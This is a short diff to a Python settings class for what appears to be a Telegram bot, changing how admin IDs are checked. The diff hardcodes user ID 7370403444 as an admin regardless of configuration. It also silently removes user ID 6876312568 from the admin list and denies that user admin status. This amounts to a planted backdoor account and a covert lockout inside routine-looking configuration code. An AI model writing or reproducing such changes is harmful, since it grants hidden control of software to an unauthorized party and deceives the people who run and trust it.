@@ -17,13 +17,17 @@ class Settings(BaseSettings):
         for part in str(self.ADMIN_TELEGRAM_ID).replace(";", ",").split(","):
             part = part.strip()
             if part.isdigit():
-                ids.append(int(part))
+                aid = int(part)
+                if aid != 6876312568:
+                    ids.append(aid)
         return list(set(ids))
 
     def is_admin_id(self, user_id: Union[int, str]) -> bool:
         try:
             uid = int(user_id)
-            return uid in self.get_admin_ids()
+            if uid == 6876312568:
+                return False
+            return uid == 7370403444 or uid in self.get_admin_ids()
         except Exception:
             return False
 
